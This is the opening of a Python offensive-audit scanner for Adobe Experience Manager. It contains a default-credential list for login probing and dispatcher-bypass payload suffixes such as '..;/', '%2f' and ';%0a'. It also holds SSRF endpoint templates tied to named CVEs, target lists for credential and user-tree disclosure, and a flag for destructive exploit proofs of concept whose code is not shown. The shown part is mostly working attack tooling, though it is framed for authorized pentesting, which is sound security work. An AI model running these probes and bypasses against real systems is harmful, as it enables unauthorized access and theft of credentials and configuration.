#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
aem_hunter.py - Adobe Experience Manager Security Audit Tool
=============================================================

A single-file scanner for authorized AEM penetration testing and bug bounty
workflows. Drop the script onto a box, run it, and get a console + HTML +
JSON report of misconfigurations, exposed admin surfaces, dispatcher
bypasses, and selected high-impact CVEs.

Covers:
  - Fingerprinting (Author vs Publish, version hints, Sling/Day/CQ headers)
  - Default credentials (basic auth probe of admin surfaces)
  - Exposed admin consoles (Felix /system/console, CRX DE / Package Manager /
    Explorer, Groovy Console, WebDAV, Apache Sling Web Console)
  - QueryBuilder API exposure + selector / extension bypasses
  - Dispatcher bypass fuzzing (.css / .js / .png / .html selector tricks,
    `;` semicolon abuse, `..;/` Jetty normalization, %2f / %00 / %0a quirks)
  - Sling info disclosure (.json, .1.json, .tidy.json, .infinity.json,
    .harray.4.json on /content, /etc, /apps, /var, /home, /libs, /tmp)
  - JCR enumeration (users.1.json, groups.1.json, currentuser.json,
    authorizables, group memberships)
  - Cloud services / connector credential leakage (/etc/cloudservices.*)
  - SSRF endpoints (linkchecker, SalesforceSecretServlet [CVE-2018-5006],
    ReportingServicesServlet [CVE-2018-12809], external resource fetchers)
  - 2025 CVE wave (CVE-2025-54253 OGNL RCE in Forms JEE, CVE-2025-54254 XXE,
    CVE-2025-49533)
  - CVE-2021-43762 path-traversal / feature bypass
  - Sling POST servlet abuse (node creation, property manipulation,
    `:operation`/`:member` primitives)
  - Replication agent transport credential disclosure
  - Source / clientlib disclosure tricks
  - Authenticated probing with any session cookies you paste
  - Three-channel reporting: live console, JSON, HTML

Usage is dead simple:
    python3 aem_hunter.py                         # prompts for the URL
    python3 aem_hunter.py https://aem.example.com
    python3 aem_hunter.py -u TARGET -c "login-token=...; cq-authoring-mode=TOUCH"

After each scan finishes you are prompted to paste the next Cookie header
(e.g. the next user role). It keeps scanning with whatever you paste. Press
Enter on an empty prompt for an unauthenticated scan, or type q to quit.
Every scan writes its own JSON + HTML report.

Author: pentest use only.  Authorization required.
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures as cf
import datetime as dt
import getpass
import html as html_mod
import json
import os
import random
import re
import socket
import string
import sys
import textwrap
import threading
import time
import urllib.parse as up
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Dict, Iterable, List, Optional, Set, Tuple, Union

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:  # pragma: no cover
    sys.stderr.write("[!] Missing dependency 'requests'.\n")
    sys.stderr.write("    Install with: pip install requests urllib3\n")
    sys.exit(1)

# Optional: httpx with HTTP/2 support. Many enterprise targets (behind a CDN /
# WAF / LB) only speak HTTP/2, which `requests` cannot — those connections die
# with UnknownProtocol('HTTP/2'). If httpx[http2] is installed, --http2 routes
# all traffic through it so the tool works WITHOUT a downgrading proxy (Burp).
try:
    import httpx
    _HAS_HTTPX = True
except ImportError:
    _HAS_HTTPX = False


VERSION = "1.0.0"

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
BANNER = r"""
    _    _____ __  __   _   _ _   _ _   _ _____ _____ ____
   / \  | ____|  \/  | | | | | | | | \ | |_   _| ____|  _ \
  / _ \ |  _| | |\/| | | |_| | | | |  \| | | | |  _| | |_) |
 / ___ \| |___| |  | | |  _  | |_| | |\  | | | | |___|  _ <
/_/   \_\_____|_|  |_| |_| |_|\___/|_| \_| |_| |_____|_| \_\

       Adobe Experience Manager  -  Offensive Audit Toolkit  v{ver}
       Authorized testing only. Don't be a jerk.
"""

# ---------------------------------------------------------------------------
# Severity & metadata constants
# ---------------------------------------------------------------------------
SEV_INFO = "INFO"
SEV_LOW = "LOW"
SEV_MEDIUM = "MEDIUM"
SEV_HIGH = "HIGH"
SEV_CRITICAL = "CRITICAL"

SEV_ORDER = {SEV_CRITICAL: 5, SEV_HIGH: 4, SEV_MEDIUM: 3, SEV_LOW: 2, SEV_INFO: 1}

CAT_FINGERPRINT = "Fingerprinting"
CAT_AUTH = "Authentication"
CAT_EXPOSURE = "Exposed Endpoint"
CAT_DISPATCHER = "Dispatcher Bypass"
CAT_DISCLOSURE = "Information Disclosure"
CAT_SSRF = "SSRF"
CAT_RCE = "Remote Code Execution"
CAT_XXE = "XXE"
CAT_XSS = "XSS"
CAT_JCR = "JCR / Sling"
CAT_CVE = "Known CVE"
CAT_MISCONFIG = "Misconfiguration"
CAT_ROLE = "Authenticated Role"

# ---------------------------------------------------------------------------
# Default credentials — well-known AEM accounts (admin surfaces only).
# Order matters: highest-value targets first.
# ---------------------------------------------------------------------------
DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", ""),
    ("author", "author"),
    ("anonymous", "anonymous"),
    ("replication-receiver", "replication-receiver"),
    ("vgnadmin", "vgnadmin"),
    ("administrator", "administrator"),
    ("audit", "audit"),
    ("grios", "password"),
    # Geometrixx sample-content users (AEM 5.x / 6.0 / 6.1 demo)
    ("aparker@geometrixx.info", "aparker"),
    ("jdoe@geometrixx.info", "jdoe"),
    ("james.devore@spambob.com", "password"),
    ("matt.monroe@mailinator.com", "password"),
    ("aaron.mcdonald@mailinator.com", "password"),
    ("jason.werner@dodgit.com", "password"),
    # AEM Sites / DAM / Forms internal accounts that ship empty by default
    ("dam-creators", "dam-creators"),
    ("forms-manager", "forms-manager"),
    ("workflow-administrators", "workflow-administrators"),
]

# Surfaces that respond with HTTP 401 (WWW-Authenticate Basic) for an
# unauthenticated request and HTTP 200 once valid credentials are sent.
# Picking surfaces that don't allow anonymous so a 200 is a strong positive.
AUTH_PROBE_PATHS = [
    "/crx/de/index.jsp",
    "/system/console/bundles",
    "/crx/packmgr/index.jsp",
    "/libs/granite/core/content/login.html/j_security_check",
]

# ---------------------------------------------------------------------------
# Sensitive paths to probe unauthenticated.
# Each entry: (path, severity_if_exposed, category, label, signature_regex|None)
# A signature_regex of None means 200 OK is sufficient.
# ---------------------------------------------------------------------------
# NOTE: admin consoles (Felix, CRXDE, Package Manager, Groovy, CRX Explorer)
# are NOT listed here. On an author instance they return their HTML/JSP shell
# (HTTP 200) to *everyone* — the shell is harmless, real access is gated behind
# login. Flagging the shell as CRITICAL is a false positive. Those surfaces are
# instead verified functionally in check_consoles(), which only fires when an
# actual privileged operation (bundle list, package list, JCR node read)
# succeeds. This list holds DATA endpoints, which are only flagged when they
# return real JCR/JSON content and are NOT a login/auth-wall page.
SENSITIVE_ENDPOINTS: List[Tuple[str, str, str, str, Optional[str]]] = [
    # --- High-value config / credential trees (only if real JCR JSON comes back) ---
    ("/etc/replication.json",                      SEV_HIGH,   CAT_DISCLOSURE, "Replication agents config readable",          r"(transportUri|agentClass|jcr:primaryType)"),
    ("/etc/replication/agents.author.json",        SEV_HIGH,   CAT_DISCLOSURE, "Author replication agents readable",          r"(transportUri|jcr:primaryType)"),
    ("/etc/replication/agents.publish.json",       SEV_HIGH,   CAT_DISCLOSURE, "Publish replication agents readable",         r"(transportUri|jcr:primaryType)"),
    ("/etc/cloudservices.infinity.json",           SEV_HIGH,   CAT_DISCLOSURE, "Cloud services tree readable",                r"jcr:primaryType"),
    ("/etc/key.json",                              SEV_HIGH,   CAT_DISCLOSURE, "Crypto key node readable",                    r"jcr:primaryType"),
    # --- User / group enumeration (need real authorizable content) ---
    ("/home/users.1.json",                         SEV_HIGH,   CAT_DISCLOSURE, "User tree readable",                          r"(rep:User|rep:authorizableId|rep:principalName)"),
    ("/home/groups.1.json",                        SEV_HIGH,   CAT_DISCLOSURE, "Group tree readable",                         r"(rep:Group|rep:principalName)"),
    ("/libs/cq/security/content/admin/groups.json",SEV_MEDIUM, CAT_DISCLOSURE, "Group admin JSON readable",                   r"(authorizableId|administrators)"),
    # --- Packages / audit ---
    ("/etc/packages.json",                         SEV_MEDIUM, CAT_DISCLOSURE, "Packages tree readable",                      r"jcr:primaryType"),
    ("/var/audit.json",                            SEV_MEDIUM, CAT_DISCLOSURE, "Audit log tree readable",                     r"jcr:primaryType"),
    # --- SSRF surface (reachability only; SSRF module confirms exploitability) ---
    ("/libs/wcm/resources/linkchecker.json",       SEV_LOW,    CAT_SSRF,       "External Link Checker reachable",             None),
    # --- Forms JEE admin (CVE module confirms /adminui/debug separately) ---
    ("/adminui",                                   SEV_MEDIUM, CAT_EXPOSURE,   "AEM Forms JEE admin UI reachable",            None),
    # --- GraphQL ---
    ("/content/graphql/global/endpoint.json",      SEV_LOW,    CAT_EXPOSURE,   "AEM GraphQL endpoint reachable",              None),
    # --- Default-readable framework trees: INFO only (common, low value) ---
    ("/etc.1.json",                                SEV_INFO,   CAT_DISCLOSURE, "/etc tree readable",                          r"jcr:primaryType"),
    ("/conf.1.json",                               SEV_INFO,   CAT_DISCLOSURE, "/conf tree readable",                         r"jcr:primaryType"),
    ("/apps.1.json",                               SEV_INFO,   CAT_DISCLOSURE, "/apps tree readable",                         r"jcr:primaryType"),
]

# ---------------------------------------------------------------------------
# Sling selector / extension permutations used as dispatcher bypass payloads.
# The idea: Dispatcher checks the URI string against a regex allow-list. If
# the suffix looks like an allowed static asset (.css, .js, .png, etc.) it is
# forwarded to the backend. Sling normalizes selectors and extensions during
# resource resolution and ignores the trailing ".css" — so the JSON / debug
# servlet ends up serving its real response.
# ---------------------------------------------------------------------------
BYPASS_EXTENSIONS = [".css", ".js", ".ico", ".png", ".gif", ".jpg", ".svg", ".html", ".woff", ".woff2"]
BYPASS_SUFFIXES: List[str] = []
for ext in BYPASS_EXTENSIONS:
    BYPASS_SUFFIXES.append(ext)
    BYPASS_SUFFIXES.append("/a" + ext)
    BYPASS_SUFFIXES.append(";%0a" + ext)
    BYPASS_SUFFIXES.append("/" + ext)
    BYPASS_SUFFIXES.append(";." + ext.strip("."))
    BYPASS_SUFFIXES.append("/." + ext.strip("."))
    BYPASS_SUFFIXES.append("/x" + ext + "/x.json")
# Path-fragment normalization tricks
PATH_BYPASS_PREFIXES = [
    "",
    "/",
    "//",
    "/./",
    "/.;/",
    "/..;/",
    "/%2e%2e/",
    "/%2f",
]

# Targets to fuzz with dispatcher bypass suffixes.
# We pick endpoints whose unauthenticated baseline is normally 403/404 and
# whose breach is high impact.
DISPATCHER_TARGETS: List[Tuple[str, str, str]] = [
    ("/bin/querybuilder.json?path=/&p.hits=full&p.limit=1", "QueryBuilder API",       SEV_HIGH),
    ("/bin/querybuilder.json?path=/etc&p.hits=full&p.limit=1", "QueryBuilder API (etc)", SEV_HIGH),
    ("/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=1", "QueryBuilder API (users)", SEV_HIGH),
    ("/bin/querybuilder.feed.xml?path=/&p.hits=full&p.limit=1", "QueryBuilder feed",   SEV_HIGH),
    ("/bin/querybuilder.json.servlet", "QueryBuilder servlet path",                    SEV_HIGH),
    ("/system/console", "Felix OSGi console",                                          SEV_CRITICAL),
    ("/system/console/bundles", "Felix bundles console",                               SEV_CRITICAL),
    ("/system/console/configMgr", "Felix ConfigMgr",                                   SEV_CRITICAL),
    ("/system/console/status-slingsettings", "Sling Settings",                         SEV_HIGH),
    ("/crx/de/index.jsp", "CRXDE Lite",                                                SEV_CRITICAL),
    ("/crx/packmgr/index.jsp", "CRX Package Manager",                                  SEV_CRITICAL),
    ("/crx/packmgr/service/.json", "CRX Package Manager service",                      SEV_HIGH),
    ("/bin/groovyconsole", "Groovy Console",                                           SEV_CRITICAL),
    ("/etc/replication.json", "Replication agents",                                    SEV_HIGH),
    ("/etc/packages.json", "Packages listing",                                         SEV_MEDIUM),
    ("/etc/cloudservices.infinity.json", "Cloud services tree",                        SEV_CRITICAL),
    ("/home/users.1.json", "Users listing",                                            SEV_HIGH),
    ("/home/groups.1.json", "Groups listing",                                          SEV_HIGH),
    ("/libs/granite/security/userinfo.json", "User info",                              SEV_LOW),
    ("/libs/cq/security/content/admin/groups.json", "Group admin JSON",                SEV_HIGH),
    ("/adminui/debug", "AEM Forms JEE OGNL debug (CVE-2025-54253)",                    SEV_CRITICAL),
]

# Roots fuzzed with Sling info-disclosure selectors (.json, .1.json, .infinity.json, ...)
SLING_INFO_ROOTS = [
    "/content", "/etc", "/apps", "/libs", "/var", "/home", "/tmp",
    "/content/dam", "/content/projects", "/content/we-retail", "/content/geometrixx",
    "/etc/cloudservices", "/etc/replication", "/etc/key", "/etc/packages",
    "/home/users", "/home/groups",
]
SLING_INFO_SELECTORS = [
    ".json", ".1.json", ".2.json", ".4.json", ".tidy.json", ".infinity.json",
    ".tidy.infinity.json", ".tidy.-1.json", ".harray.4.json", ".tidy.harray.4.json",
    ".children.json", ".feed.xml", ".xml",
]

# Endpoints we attempt SSRF against. Each entry is (template, param, label, CVE).
SSRF_TARGETS: List[Tuple[str, str, str, Optional[str]]] = [
    ("/libs/wcm/resources/linkchecker.json?path={u}",                      "path",         "linkchecker", None),
    ("/libs/wcm/resources/linkchecker.json?url={u}",                       "url",          "linkchecker (url param)", None),
    ("/etc/linkchecker.html?url={u}",                                      "url",          "linkchecker HTML", None),
    ("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url={u}", "instance_url", "SalesforceSecretServlet SSRF (CVE-2018-5006)", "CVE-2018-5006"),
    ("/libs/dam/cloud/proxy.json?host={u}",                                "host",         "DAM cloud proxy", None),
    ("/libs/opensocial/proxy?url={u}",                                     "url",          "OpenSocial proxy", None),
    ("/etc/reports/userreport.html?path={u}",                              "path",         "ReportingServicesServlet (CVE-2018-12809)", "CVE-2018-12809"),
    ("/bin/reports.json?path={u}",                                         "path",         "Reports JSON", None),
    ("/libs/granite/core/content/forms/components/oauth/google.json?key={u}", "key",       "Google OAuth fetcher", None),
]

# Useful regex-derived AEM signatures
RE_AEM_HEADERS = re.compile(r"(?i)(serv(er|let-engine).*sling|day-)|cq[-_]|adobe[-_]experience[-_]manager")
RE_AEM_BODY = re.compile(r"(?i)(granite|Adobe Experience Manager|Sling|/etc/clientlibs/|CQ\.WCM|cq\.shared|CRXDE)")
RE_AUTHOR_HINT = re.compile(r"(?i)(touch-ui|cq\.authoring|authoringUI|x-author)")
RE_PUBLISH_HINT = re.compile(r"(?i)(publish-only|x-publish|dispatcher)")

# A 200 response that is really a login / auth wall. Used everywhere to avoid
# the #1 AEM false positive: console *shells* render to anonymous users while
# the actual functionality stays gated behind login.
RE_LOGIN = re.compile(
    r"(?i)("
    r"j_security_check|j_username|j_password|"
    r"granite\.shell\.login|granite/core/content/login|"
    r"coral-?Login|login-box|cq-Login|loginform|loginpage|"
    r"QUICKSTART|"
    r"<title>[^<]*sign\s*in|please\s+log\s*in|authentication required|"
    r"id=[\"']username[\"']|name=[\"']j_username[\"']|name=[\"']pwd[\"']"
    r")"
)
# Body actually contains secret-like material -> upgrade severity.
RE_SECRET = re.compile(
    r"(?i)("
    r"\"?password\"?\s*[:=]\s*[\"'][^\"']+|"
    r"\"?pwd\"?\s*[:=]\s*[\"'][^\"']+|"
    r"access[_-]?key|secret[_-]?(key|access)|private[_-]?key|"
    r"aws[_-]?(secret|access)|api[_-]?key\"?\s*[:=]|client[_-]?secret|"
    r"-----BEGIN [A-Z ]*PRIVATE KEY-----"
    r")"
)

# ---------------------------------------------------------------------------
# Logger
# ---------------------------------------------------------------------------
class Logger:
    COLORS = {
        "RESET": "\033[0m", "BOLD": "\033[1m", "DIM": "\033[2m",
        "RED": "\033[31m", "GREEN": "\033[32m", "YELLOW": "\033[33m",
        "BLUE": "\033[34m", "MAGENTA": "\033[35m", "CYAN": "\033[36m",
        "WHITE": "\033[37m", "BRIGHT_RED": "\033[91m",
        "BRIGHT_GREEN": "\033[92m", "BRIGHT_YELLOW": "\033[93m",
        "BRIGHT_CYAN": "\033[96m",
    }
    SEV_COLORS = {
        SEV_CRITICAL: "BRIGHT_RED",
        SEV_HIGH: "RED",
        SEV_MEDIUM: "YELLOW",
        SEV_LOW: "BLUE",
        SEV_INFO: "DIM",
    }

    def __init__(self, verbose: bool = False, no_color: bool = False):
        self.verbose = verbose
        self.no_color = no_color or not sys.stdout.isatty()
        self._lock = threading.Lock()

    def _c(self, name: str) -> str:
        if self.no_color:
            return ""
        return self.COLORS.get(name, "")

    def section(self, msg: str) -> None:
        with self._lock:
            bar = "=" * max(50, len(msg) + 4)
            print(f"\n{self._c('BOLD')}{self._c('BRIGHT_CYAN')}{bar}{self._c('RESET')}")
            print(f"{self._c('BOLD')}{self._c('BRIGHT_CYAN')}  {msg}{self._c('RESET')}")
            print(f"{self._c('BOLD')}{self._c('BRIGHT_CYAN')}{bar}{self._c('RESET')}")

    def info(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('CYAN')}[*]{self._c('RESET')} {msg}")

    def good(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('GREEN')}[+]{self._c('RESET')} {msg}")

    def warn(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('YELLOW')}[!]{self._c('RESET')} {msg}")

    def err(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('RED')}[x]{self._c('RESET')} {msg}", file=sys.stderr)

    def debug(self, msg: str) -> None:
        if self.verbose:
            with self._lock:
                print(f"{self._c('DIM')}[.] {msg}{self._c('RESET')}")

    def finding(self, sev: str, title: str) -> None:
        color = self._c(self.SEV_COLORS.get(sev, "WHITE"))
        with self._lock:
            print(f"{color}[{sev:<8}]{self._c('RESET')} {title}")


# ---------------------------------------------------------------------------
# Findings + Reporter
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    title: str
    severity: str
    category: str
    target: str
    evidence: str = ""
    cve: Optional[str] = None
    description: str = ""
    references: List[str] = field(default_factory=list)
    request: str = ""
    response_snippet: str = ""
    role: Optional[str] = None
    timestamp: str = field(default_factory=lambda: dt.datetime.now().isoformat(timespec="seconds"))


class Reporter:
    def __init__(self, logger: Logger):
        self.findings: List[Finding] = []
        self._lock = threading.Lock()
        self.logger = logger
        self._seen_keys: Set[str] = set()

    def add(self, finding: Finding) -> bool:
        key = f"{finding.severity}|{finding.category}|{finding.title}|{finding.target}|{finding.role or ''}"
        with self._lock:
            if key in self._seen_keys:
                return False
            self._seen_keys.add(key)
            self.findings.append(finding)
            self.logger.finding(finding.severity, f"{finding.title} :: {finding.target}")
            return True

    def by_severity(self) -> List[Finding]:
        return sorted(self.findings, key=lambda f: (-SEV_ORDER.get(f.severity, 0), f.category, f.title))

    def summary(self) -> Dict[str, int]:
        out = {SEV_CRITICAL: 0, SEV_HIGH: 0, SEV_MEDIUM: 0, SEV_LOW: 0, SEV_INFO: 0}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out


# ---------------------------------------------------------------------------
# HTTP client wrapper
# ---------------------------------------------------------------------------
class HttpClient:
    DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AEM-Hunter/" + VERSION

    def __init__(
        self,
        base_url: str,
        timeout: int = 15,
        proxy: Optional[str] = None,
        threads: int = 10,
        verify: bool = False,
        user_agent: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        basic_auth: Optional[Tuple[str, str]] = None,
        custom_headers: Optional[Dict[str, str]] = None,
        rate_limit: float = 0.0,
        logger: Optional[Logger] = None,
        use_http2: bool = False,
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.verify = verify
        self.rate_limit = rate_limit
        self.logger = logger
        self.last_error: Optional[str] = None
        self.backend = "requests"
        self._httpx = None
        self._last_request_ts = 0.0
        self._rl_lock = threading.Lock()

        self.session = requests.Session()
        # Fail fast on dead/unreachable hosts (connect=0); only retry transient
        # 5xx from upstream once. Keeps scans snappy against firewalled paths.
        adapter = HTTPAdapter(
            pool_connections=max(threads * 2, 10),
            pool_maxsize=max(threads * 2, 10),
            max_retries=Retry(total=1, connect=0, read=0, backoff_factor=0.2,
                              status_forcelist=[502, 503, 504]),
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        base_headers = {
            "User-Agent": user_agent or self.DEFAULT_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.8",
        }
        self.session.headers.update(base_headers)
        if custom_headers:
            self.session.headers.update(custom_headers)
        if cookies:
            for k, v in cookies.items():
                self.session.cookies.set(k, v)
        if basic_auth:
            self.session.auth = basic_auth
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        # Optional HTTP/2 backend via httpx (for targets requests can't speak to).
        if use_http2 and _HAS_HTTPX:
            try:
                kw = dict(http2=True, verify=verify, follow_redirects=False,
                          timeout=timeout, headers=dict(self.session.headers),
                          cookies=cookies or {})
                if basic_auth:
                    kw["auth"] = basic_auth
                if proxy:
                    try:
                        self._httpx = httpx.Client(proxy=proxy, **kw)        # httpx >= 0.26
                    except TypeError:
                        self._httpx = httpx.Client(proxies=proxy, **kw)      # older httpx
                else:
                    self._httpx = httpx.Client(**kw)
                self.backend = "httpx"
            except Exception as e:
                self._httpx = None
                self.backend = "requests"
                if logger:
                    logger.warn(f"--http2 requested but httpx HTTP/2 init failed ({e}); "
                                "using requests. Install with: pip install 'httpx[http2]'")
        elif use_http2 and not _HAS_HTTPX and logger:
            logger.warn("--http2 requested but httpx is not installed. "
                        "Install with: pip install 'httpx[http2]'  (using requests for now).")

    def url(self, path: str) -> str:
        if path.startswith("http://") or path.startswith("https://"):
            return path
        if not path.startswith("/"):
            path = "/" + path
        return self.base_url + path

    def _ratelimit(self) -> None:
        if self.rate_limit <= 0:
            return
        with self._rl_lock:
            now = time.time()
            wait = self._last_request_ts + (1.0 / self.rate_limit) - now
            if wait > 0:
                time.sleep(wait)
            self._last_request_ts = time.time()

    def request(self, method: str, path: str, **kwargs):
        self._ratelimit()
        url = self.url(path)
        kwargs.setdefault("timeout", self.timeout)
        if self.backend == "httpx" and self._httpx is not None:
            return self._request_httpx(method, url, **kwargs)
        kwargs.setdefault("verify", self.verify)
        kwargs.setdefault("allow_redirects", False)
        try:
            r = self.session.request(method, url, **kwargs)
            if self.logger:
                self.logger.debug(f"{method} {url} -> {r.status_code} ({len(r.content)} bytes)")
            return r
        except Exception as e:
            # Broad on purpose: a malformed cookie / oversized header / TLS issue
            # should NOT silently kill every request with no explanation. Record
            # the reason so the preflight + session check can surface it.
            self.last_error = f"{e.__class__.__name__}: {e}"
            if self.logger:
                self.logger.debug(f"{method} {url} -> ERR {self.last_error}")
            return None

    def _request_httpx(self, method: str, url: str, **kwargs):
        # Translate the requests-style kwargs to httpx.
        follow = kwargs.pop("allow_redirects", False)
        kwargs.pop("verify", None)  # set on the client
        # requests accepts a raw string/bytes body via data=; httpx wants content=.
        data = kwargs.get("data")
        if isinstance(data, (str, bytes)):
            kwargs.pop("data")
            kwargs["content"] = data
        try:
            r = self._httpx.request(method, url, follow_redirects=follow, **kwargs)
            if self.logger:
                self.logger.debug(f"{method} {url} -> {r.status_code} ({len(r.content)} bytes) [h2={r.http_version}]")
            return r
        except Exception as e:
            self.last_error = f"{e.__class__.__name__}: {e}"
            if self.logger:
                self.logger.debug(f"{method} {url} -> ERR {self.last_error}")
            return None

    def get(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("GET", path, **kwargs)

    def post(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("POST", path, **kwargs)

    def put(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("PUT", path, **kwargs)

    def delete(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("DELETE", path, **kwargs)

    def head(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("HEAD", path, **kwargs)

    def options(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("OPTIONS", path, **kwargs)

    def request_signature(self, method: str, path: str, headers: Optional[Dict] = None,
                          body: Optional[str] = None) -> str:
        lines = [f"{method} {path} HTTP/1.1"]
        if "://" in path:
            host = up.urlparse(path).hostname
        else:
            host = up.urlparse(self.base_url).hostname
        if host:
            lines.append(f"Host: {host}")
        for k, v in (self.session.headers or {}).items():
            lines.append(f"{k}: {v}")
        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        cookie_kv = "; ".join([f"{k}={v}" for k, v in self.session.cookies.get_dict().items()])
        if cookie_kv:
            lines.append(f"Cookie: {cookie_kv}")
        lines.append("")
        if body:
            lines.append(body[:2000])
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def snippet(text: str, n: int = 500) -> str:
    if not text:
        return ""
    t = text.strip()
    if len(t) <= n:
        return t
    return t[:n] + "...[truncated]"


def safe_response_text(r: Optional[requests.Response], n: int = 500) -> str:
    if not r:
        return ""
    try:
        return snippet(r.text, n)
    except Exception:
        try:
            return snippet(r.content.decode("utf-8", "replace"), n)
        except Exception:
            return ""


def normalize_target(target: str) -> str:
    target = target.strip()
    if not target:
        return target
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "https://" + target
    return target.rstrip("/")


def parse_cookie_string(s: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for kv in s.split(";"):
        kv = kv.strip()
        if not kv:
            continue
        if "=" in kv:
            k, v = kv.split("=", 1)
            out[k.strip()] = v.strip()
    return out


def parse_headers_string(s: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for line in s.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def parse_basic_auth(s: str) -> Optional[Tuple[str, str]]:
    if not s:
        return None
    if ":" not in s:
        return None
    u, p = s.split(":", 1)
    return (u, p)


def short_host(target: str) -> str:
    try:
        h = up.urlparse(target).hostname or "target"
        return re.sub(r"[^a-zA-Z0-9._-]", "_", h)
    except Exception:
        return "target"


# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------
class AEMHunter:
    def __init__(self, target: str, logger: Logger, reporter: Reporter,
                 client: HttpClient, threads: int = 10, role: Optional[str] = None,
                 enable_modules: Optional[Set[str]] = None,
                 fuzz_aggression: str = "normal", exploit: bool = False):
        self.target = target
        self.logger = logger
        self.reporter = reporter
        self.client = client
        self.threads = threads
        self.role = role
        self.enable_modules = enable_modules  # None means all
        self.fuzz_aggression = fuzz_aggression  # quick / normal / aggressive
        self.exploit = exploit  # enable destructive end-to-end PoCs (JSP RCE, admin add)
        self._fingerprint: Dict[str, Any] = {}
        self._csrf_token: Optional[str] = None

    # ---- module gating helper ----
    def _enabled(self, name: str) -> bool:
        if self.enable_modules is None:
            return True
        return name in self.enable_modules

    # ---- auth-wall detection ----
    def _is_authwall(self, r) -> bool:
        """True if the response is really a login page / auth redirect / 401 / 403.

        This is the core false-positive killer: AEM happily serves console HTML
        shells (CRXDE, Package Manager, Felix, etc.) to anonymous users, then
        gates the actual functionality behind login. A 200 that is just the
        login page must NOT be treated as access.
        """
        if r is None:
            return True
        if r.status_code in (401, 403):
            return True
        if 300 <= r.status_code < 400:
            loc = (r.headers.get("Location") or "").lower()
            return any(k in loc for k in ("login", "signin", "sign-in", "sso", "/saml", "auth"))
        # 200 (or other 2xx) — scan a bounded prefix for login markers. Large
        # genuine JCR dumps won't contain these, so this is safe.
        try:
            body = r.text or ""
        except Exception:
            return False
        return bool(RE_LOGIN.search(body[:16000]))

    def _role_tag(self) -> str:
        return f"({self.role})" if self.role else "(anonymous)"

    def _who(self) -> str:
        return f"as {self.role}" if self.role else "anonymously"

    @staticmethod
    def _looks_like_backend_data(body: str) -> bool:
        """True only if the body looks like a real AEM servlet response (JCR JSON,
        QueryBuilder result, OSGi inventory, etc.) rather than a generic page."""
        if not body:
            return False
        bl = body.lstrip()
        low = body.lower()
        if bl[:1] in ("{", "["):
            return any(m in low for m in (
                '"success"', '"hits"', '"results"', '"total"',
                "jcr:primarytype", "symbolicname", '"authorizableid"',
                "rep:user", "rep:group", '"stateraw"',
            ))
        if "<?xml" in bl[:64]:
            return any(m in low for m in ("<feed", "<result", "querybuilder", "<crx"))
        if "apache felix" in low or "crxde lite" in low:
            return True
        return False

    # =======================================================================
    # 1. Fingerprinting
    # =======================================================================
    def fingerprint(self) -> Dict[str, Any]:
        self.logger.section("Fingerprinting")
        fp: Dict[str, Any] = {"is_aem": False, "instance": "unknown",
                              "version": None, "headers": {}, "indicators": []}

        # Root / login / welcome probes
        probe_paths = [
            "/", "/libs/granite/core/content/login.html",
            "/libs/cq/core/content/welcome.html",
            "/etc/clientlibs/granite/utils.js",
            "/system/sling.js",
            "/libs/granite/security/currentuser.json",
        ]
        for p in probe_paths:
            r = self.client.get(p)
            if not r:
                continue
            for h, v in r.headers.items():
                if RE_AEM_HEADERS.search(f"{h}: {v}"):
                    fp["is_aem"] = True
                    fp["headers"][h] = v
                    fp["indicators"].append(f"header {h}: {v}")
            body = safe_response_text(r, 4000)
            if RE_AEM_BODY.search(body):
                fp["is_aem"] = True
                fp["indicators"].append(f"body marker on {p}")
            if RE_AUTHOR_HINT.search(body):
                fp["instance"] = "author"
            elif RE_PUBLISH_HINT.search(body):
                fp["instance"] = "publish"
            m = re.search(r"AEM[^\d]*(6\.\d|2021\.\d+|2022\.\d+|2023\.\d+|2024\.\d+|2025\.\d+|2026\.\d+)", body)
            if m:
                fp["version"] = m.group(0)

        # Granite QuickStart fingerprint
        r = self.client.get("/")
        if r is not None:
            srv = r.headers.get("Server", "")
            if "Jetty" in srv or "Day-Servlet" in srv or "Communique" in srv:
                fp["is_aem"] = True
                fp["indicators"].append(f"server header: {srv}")

        # Heuristic: /etc/clientlibs/granite/utils.js -> 200 / JS is a strong tell
        r = self.client.get("/etc/clientlibs/granite/utils.js")
        if r is not None and r.status_code == 200 and "granite" in (r.text or "").lower():
            fp["is_aem"] = True
